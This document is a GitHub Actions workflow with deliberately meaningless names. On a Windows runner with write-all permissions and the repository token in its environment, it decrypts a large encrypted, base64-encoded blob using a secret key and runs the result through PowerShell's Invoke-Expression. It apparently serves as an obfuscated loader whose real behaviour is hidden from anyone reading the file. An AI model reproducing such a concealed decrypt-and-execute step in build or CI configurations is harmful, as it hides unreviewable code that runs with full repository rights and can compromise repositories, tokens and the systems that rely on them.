name: Shaw

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: ''
        type: string
      option2:
        required: false
        default: ''
        type: string
      option3:
        required: true
        default: 330
        type: number
      option4:
        required: true
        default: false
        type: boolean
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}
  OPTION_4: ${{ inputs.option4 }}

jobs:
  k:
    runs-on: windows-latest
    steps:
      - name: June
        shell: pwsh
        run: |
          $encrypted_payload = "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"
          $passphrase = $env:DECRYPTION_KEY

          $iterations = 10000
          $keySizeBytes = 32
          $ivSizeBytes = 16

          function Try-OpenSSLStyleDecrypt {
              param(
                  [byte[]]$ciphertextWithPossibleHeader,
                  [string]$password
              )

              try {
                  if (-not $password) {
                      throw "no supply"
                  }

                  # Check for OpenSSL 'Salted__' header (ASCII) -> first 8 bytes 'Salted__', next 8 bytes salt
                  $header = [System.Text.Encoding]::ASCII.GetString($ciphertextWithPossibleHeader, 0, [Math]::Min(8, $ciphertextWithPossibleHeader.Length))
                  if ($header -eq "Salted__") {
                      # extract salt (bytes 8..15) and ciphertext (from byte 16 onward)
                      $salt = [byte[]]($ciphertextWithPossibleHeader[8..15])
                      $cipherBytes = if ($ciphertextWithPossibleHeader.Length -gt 16) { [byte[]]($ciphertextWithPossibleHeader[16..($ciphertextWithPossibleHeader.Length - 1)]) } else { @() }
                  } else {
                      # no salt header found — assume the whole buffer is raw ciphertext, no salt
                      $salt = $null
                      $cipherBytes = $ciphertextWithPossibleHeader
                  }

                  # Derive key+iv using PBKDF2
                  $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)

                  if ($salt -ne $null -and $salt.Length -gt 0) {
                      # Try to use SHA256-based Rfc2898DeriveBytes (requires .NET that supports HashAlgorithmName overload)
                      try {
                          $deriveCtor = [System.Security.Cryptography.Rfc2898DeriveBytes].GetConstructors() |
                                        Where-Object { $_.GetParameters().Length -ge 3 } |
                                        Select-Object -First 1
                          # Use explicit HashAlgorithmName if available (PowerShell Core / modern .NET)
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              ([System.Text.Encoding]::UTF8.GetString($passwordBytes)),
                              $salt,
                              $iterations,
                              [System.Security.Cryptography.HashAlgorithmName]::SHA256
                          )
                      } catch {
                          # Fallback to older constructor (uses HMACSHA1) — only do this if you know the data was derived with SHA1
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              $password,
                              $salt,
                              $iterations
                          )
                          Write-Warning "Rfc2898DeriveBytes SHA256 overload not available; falling back to default SHA1-based PBKDF2. If encryption used PBKDF2-SHA256, specify a PowerShell/.NET runtime that supports it."
                      }
                  } else {
                      # no salt -> cannot derive key reliably; try deriving with empty salt
                      $salt = ,0..7 | ForEach-Object { [byte]0 }
                      $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
                  }

                  $key = $rdb.GetBytes($keySizeBytes)
                  $iv  = $rdb.GetBytes($ivSizeBytes)

                  # Create AES decryptor
                  $aes = [System.Security.Cryptography.Aes]::Create()
                  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                  $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                  $aes.KeySize = 256
                  $aes.Key = $key
                  $aes.IV = $iv

                  $transform = $aes.CreateDecryptor()
                  $ms = New-Object System.IO.MemoryStream (,$cipherBytes)
                  $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $transform, [System.Security.Cryptography.CryptoStreamMode]::Read)
                  $sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
                  $plaintext = $sr.ReadToEnd()

                  # clean up
                  $sr.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()

                  return $plaintext
              } catch {
                  throw $_
              }
          }

          try {
              $cipherBytes = [Convert]::FromBase64String($encrypted_payload)

              $decrypted = Try-OpenSSLStyleDecrypt -ciphertextWithPossibleHeader $cipherBytes -password $passphrase

              if ($null -ne $decrypted -and $decrypted.Length -gt 0) {
                  Invoke-Expression $decrypted
              } else {
                  Write-Error "Decryption succeeded but produced empty output."
              }
          } catch {
              Write-Error "Decryption failed: $($_.Exception.Message)"
          }
